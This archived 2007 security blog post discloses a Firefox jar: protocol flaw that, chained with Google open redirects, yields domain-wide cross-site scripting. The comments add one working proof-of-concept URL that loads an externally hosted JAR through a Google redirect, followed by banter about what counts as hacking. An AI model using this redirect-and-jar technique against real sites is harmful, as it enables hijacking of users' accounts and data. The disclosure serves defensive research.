<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Severe XSS in Google and Others Due To The JAR Protocol Issues</title><meta name="description" content="After publishing my findings on the `jar:` URL protocol security issue for Firefox, I was contacted by MichaÅ‚ Zalewski regarding the possibilities for exploiting the vulnerability on the Google domain. I did not have much time to get back to him at the time, but I had a few ideas about how it could work. Of course, I was planning to silently release any of my findings to Michal and Google in order to prevent any attacks that may occur before Mozilla's scheduled update. The guys from Mozilla are currently busy with Firefox3, so I knew that it may take some time to properly patch the issue."><meta property="name" content="Severe XSS in Google and Others Due To The JAR Protocol Issues"><meta itemprop="name" content="Severe XSS in Google and Others Due To The JAR Protocol Issues"><meta property="description" content="After publishing my findings on the `jar:` URL protocol security issue for Firefox, I was contacted by MichaÅ‚ Zalewski regarding the possibilities for exploiting the vulnerability on the Google domain. I did not have much time to get back to him at the time, but I had a few ideas about how it could work. Of course, I was planning to silently release any of my findings to Michal and Google in order to prevent any attacks that may occur before Mozilla's scheduled update. The guys from Mozilla are currently busy with Firefox3, so I knew that it may take some time to properly patch the issue."><meta itemprop="description" content="After publishing my findings on the `jar:` URL protocol security issue for Firefox, I was contacted by MichaÅ‚ Zalewski regarding the possibilities for exploiting the vulnerability on the Google domain. I did not have much time to get back to him at the time, but I had a few ideas about how it could work. Of course, I was planning to silently release any of my findings to Michal and Google in order to prevent any attacks that may occur before Mozilla's scheduled update. The guys from Mozilla are currently busy with Firefox3, so I knew that it may take some time to properly patch the issue."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fsevere-xss-in-google-and-others-due-to-the-jar-protocol-issues%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fsevere-xss-in-google-and-others-due-to-the-jar-protocol-issues%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/severe-xss-in-google-and-others-due-to-the-jar-protocol-issues/"><meta property="og:title" content="Severe XSS in Google and Others Due To The JAR Protocol Issues"><meta property="og:description" content="After publishing my findings on the `jar:` URL protocol security issue for Firefox, I was contacted by MichaÅ‚ Zalewski regarding the possibilities for exploiting the vulnerability on the Google domain. I did not have much time to get back to him at the time, but I had a few ideas about how it could work. Of course, I was planning to silently release any of my findings to Michal and Google in order to prevent any attacks that may occur before Mozilla's scheduled update. The guys from Mozilla are currently busy with Firefox3, so I knew that it may take some time to properly patch the issue."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fsevere-xss-in-google-and-others-due-to-the-jar-protocol-issues%2F?w=1024"><meta name="twitter:title" content="Severe XSS in Google and Others Due To The JAR Protocol Issues"><meta name="twitter:description" content="After publishing my findings on the `jar:` URL protocol security issue for Firefox, I was contacted by MichaÅ‚ Zalewski regarding the possibilities for exploiting the vulnerability on the Google domain. I did not have much time to get back to him at the time, but I had a few ideas about how it could work. Of course, I was planning to silently release any of my findings to Michal and Google in order to prevent any attacks that may occur before Mozilla's scheduled update. The guys from Mozilla are currently busy with Firefox3, so I knew that it may take some time to properly patch the issue."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fsevere-xss-in-google-and-others-due-to-the-jar-protocol-issues%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Severe XSS in Google and Others Due To The JAR Protocol Issues</h1><div class="date">Sat, 10 Nov 2007 11:39:16 GMT</div><div class="author">by
<a href="/members/pdp.html">pdp</a></div><div id="post-content"><p>After <a href="/blog/web-mayhem-firefoxs-jar-protocol-issues">publishing</a> my findings on the <code>jar:</code> URL protocol security issue for Firefox, I was contacted by <a href="http://lcamtuf.coredump.cx/">MichaÅ‚ Zalewski</a> regarding the possibilities for exploiting the vulnerability on the Google domain. I did not have much time to get back to him at the time, but I had a few ideas about how it could work. Of course, I was planning to silently release any of my findings to Michal and Google in order to prevent any attacks that may occur before Mozilla&#39;s scheduled update. The guys from Mozilla are currently busy with Firefox3, so I knew that it may take some time to properly patch the issue.</p>
<p>I had a few ideas in my mind about how the problem can be exploited in terms of Google. The first one was related to uploading a JAR archive on a public Google URL (docs, groups, etc). The second idea that I had was related to tricking the browser into believing that an external archive is located on the Google domain, possibly related to some kind of redirect. I was not aware of any redirect issues at Google at the time. I kind of remembered that the mobile GMail interface had one but I forget where I&#39;ve put my notes regarding it.</p>
<p>So, I was scratching my head this morning on the problem. Meanwhile, <a href="http://blog.beford.org/?p=8">beford</a> was light-years ahead of me. He managed to prove that open redirects on Google could lead to domain wide XSS. &quot;Suddenly, it feels that the sky is falling.&quot; This means that attackers can get to any place on Google and do whatever they want with your profile and your online presence (i.e. backdoor Google service, snoop onto your searches, read your emails, etc).</p>
<p>Unfortunately, the issue is public so Google needs to make sure that they close all their open redirects (which are far too many) or Firefox should release an update <strong>now</strong>. Untill then, no one is safe! I repeat, the same technique can be applied to any other Web application out there. This is what I would like to refer to as <strong>Web-wide Cross-site Scripting</strong> vulnerabilities. There is more research coming very soon. Let&#39;s catch up at OWASP San Jose.</p>
</div><div id="post-comments"><p><em>Archived Comments</em></p><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">I forgot to mention how the attack works. Well, it is very simple. As I said, it is based on a 302 redirect, like many other similar issues:

<pre><code>jar:http://groups.google.com/searchhistory/url?url=http://beford.org/stuff/htm.jar!/htm.htm</code></pre>

Pay attention on the URL construct. 10x to beford.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/980a9333b2893d71eb736582eca4fd0c?s=256&amp;d=retro" alt="tommy"><span class="post-comment-author">tommy</span><div class="post-comment-content">Nice poc, keep up the great work ;).</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/2fbd3fcfa626bd4301c18cdbd207a7bb?s=256&amp;d=retro" alt="vindic"><span class="post-comment-author">vindic</span><div class="post-comment-content">pdp this is amazing post, thank you for you gr8 work ;)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/290e868e00e8429bf1624a461b8ef81e?s=256&amp;d=retro" alt="Giorgio Maone"><span class="post-comment-author">Giorgio Maone</span><div class="post-comment-content">"no one is safe"... a bit unfair to me ;)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">you never know ;)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/1360a092d30480b4f0c94547ee8c77e6?s=256&amp;d=retro" alt="vaj"><span class="post-comment-author">vaj</span><div class="post-comment-content">this is the lame this is not hacking
BUFFEROVERFLOW IS HACKING
(c;</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">vaj, you are sarcastic right?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/1360a092d30480b4f0c94547ee8c77e6?s=256&amp;d=retro" alt="vaj"><span class="post-comment-author">vaj</span><div class="post-comment-content">xss is not hacking because it needs interact from target

only buffer overflow of openbsd dhcpd is hacking, because every important target use openbsd for everything. that is why openbsd dhcpd exploit is the greatest hacking of all time.

no hacker is interested in hacking workstation of employee of target company and bouncing from internal workstation to sensitive data. this is not hacking because the workstation do not use openbsd dhcpd and hacker did not have to write shellcode.

because shellcode is complex, xss is not complex, therefore u should never use it to hack because only reason to hack is to impress other hackers with your exploit, not to get data or compromise network

user interaction is lame except if u distribute backdoor exploit code for openbsd dhcpd exploit and user compile and run backdoor and then you own  whitehat security company and then u write a zine about it.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><blockquote>xss is not hacking because it needs interact from target</blockquote>

so does every other client-side exploit, even if it is BF or whatever else. what do u define as hacking?

<blockquote>only buffer overflow of openbsd dhcpd is hacking, because every important target use openbsd for everything. that is why openbsd dhcpd exploit is the greatest hacking of all time.</blockquote>

you are either script kiddie or you have no idea about the security business and industry at all.

<blockquote>because shellcode is complex</blockquote>

haha :) shellcode is complex? right! I guess it is complex to you because you cannot write it.

<blockquote>user interaction is lame except if u distribute backdoor exploit code for openbsd dhcpd exploit and user compile and run backdoor and then you own whitehat security company and then u write a zine about it.</blockquote>

why do u keep mentioning BSD? what is with that? My friendly advise to you is to open your mind a little bit and stop being a sheep. Security is such a vast topic. Restricting yourself one single thing wont bring you anything good and will make you sound retarded. So, keep up with your instincts but do not judge things that you simple don't understand.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/825b8edc14000cef41673d0bedc09474?s=256&amp;d=retro" alt="Zapphod"><span class="post-comment-author">Zapphod</span><div class="post-comment-content">vaj -  Hillarious!  They don't get ya!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/15962db3bafebdaa725a4c5709ccd932?s=256&amp;d=retro" alt="Nicolas"><span class="post-comment-author">Nicolas</span><div class="post-comment-content">Oh yeah, hacking a dhcpd is the only thing that is actually hacking. LOL what an idiot XD</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/1360a092d30480b4f0c94547ee8c77e6?s=256&amp;d=retro" alt="vaj"><span class="post-comment-author">vaj</span><div class="post-comment-content">pdp your sarcasm detector is very broken :)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/80d7b8935b953dabd63268177b7981f6?s=256&amp;d=retro" alt="ronald"><span class="post-comment-author">ronald</span><div class="post-comment-content">@vaj

shellcode isn't complex, it only takes huge amounts of time to construct a correct payload, and that payload could chnage due to some conditions, and might not work all the time. So no mumbo jumbo about "hacking" and "shellcode" because it looks difficult, while it really isn't. The principles behind it are easy to grasp.

I understand what message you try to send here, but you can't say hacking is "this" or "that". Mainly for the fact that most buffer overflows all work the same, the creation of shellcode is only a process, just like programming is. If you like spending countless hours attaching crashing programs to a debugger, in order to construct decent shellcode, well that's your kick then.

I do agree however that the "jar" issue isn't bad. I don't think it's such a big issue, but that is my opinion. For the reason that a) I knew about it. b) Firefox/extensions boot up out jars. c) It's actually used for a signed javascript archives for years. d) never trust content.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/15962db3bafebdaa725a4c5709ccd932?s=256&amp;d=retro" alt="Nicolas"><span class="post-comment-author">Nicolas</span><div class="post-comment-content">vaj your sarcasm generator is very broken. Sarcasm just doesn't work on Internet.</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2022 <a href=""></a>. All rights reserved.</p></footer></body></html>